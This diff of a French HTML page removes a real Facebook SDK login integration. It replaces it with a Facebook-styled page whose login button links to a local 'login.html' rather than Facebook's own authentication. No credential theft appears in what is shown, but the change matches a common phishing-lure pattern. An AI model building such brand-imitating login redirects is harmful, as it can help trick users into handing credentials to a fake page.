@@ -2,57 +2,66 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Connexion Facebook</title>
+  <title>Accueil - Facebook Login</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+    }
+
+    h1 {
+      color: #1877F2;
+      font-size: 32px;
+      margin-bottom: 10px;
+    }
+
+    p {
+      color: #1c1e21;
+      font-size: 16px;
+      margin-bottom: 30px;
+    }
+
+    .fb-button {
+      background-color: #1877F2;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .fb-button:hover {
+      background-color: #155db8;
+    }
+  </style>
 </head>
 <body>
-  <h1>Bienvenue</h1>
-  <p>Cliquez ci-dessous pour vous connecter avec Facebook :</p>
-  <button onclick="loginWithFacebook()">Se connecter avec Facebook</button>
 
-  <div id="status"></div>
+  <div class="container">
+    <h1>Connexion</h1>
+    <p>Connectez-vous avec votre compte Facebook</p>
+    <a href="login.html">
+      <button class="fb-button">Se connecter avec Facebook</button>
+    </a>
+  </div>
 
-  <!-- SDK Facebook -->
-  <script async defer crossorigin="anonymous" 
-    src="https://connect.facebook.net/fr_FR/sdk.js"></script>
-
-  <script>
-    // Initialiser le SDK Facebook
-    window.fbAsyncInit = function() {
-      FB.init({
-        appId      : 'VOTRE_APP_ID', // ← à remplacer avec l'ID de ton app Facebook
-        cookie     : true,
-        xfbml      : true,
-        version    : 'v19.0'
-      });
-
-      // Vérifie le statut de connexion actuel
-      FB.getLoginStatus(function(response) {
-        statusChangeCallback(response);
-      });
-    };
-
-    // Réagit au statut de connexion
-    function statusChangeCallback(response) {
-      if (response.status === 'connected') {
-        document.getElementById('status').innerHTML = 'Connecté à Facebook !';
-      } else {
-        document.getElementById('status').innerHTML = 'Non connecté.';
-      }
-    }
-
-    // Lancer la connexion
-    function loginWithFacebook() {
-      FB.login(function(response) {
-        if (response.authResponse) {
-          console.log('Connexion réussie !', response);
-          statusChangeCallback(response);
-        } else {
-          console.log('Connexion annulée.');
-        }
-      }, {scope: 'public_profile,email'});
-    }
-  </script>
 </body>
 </html>
-
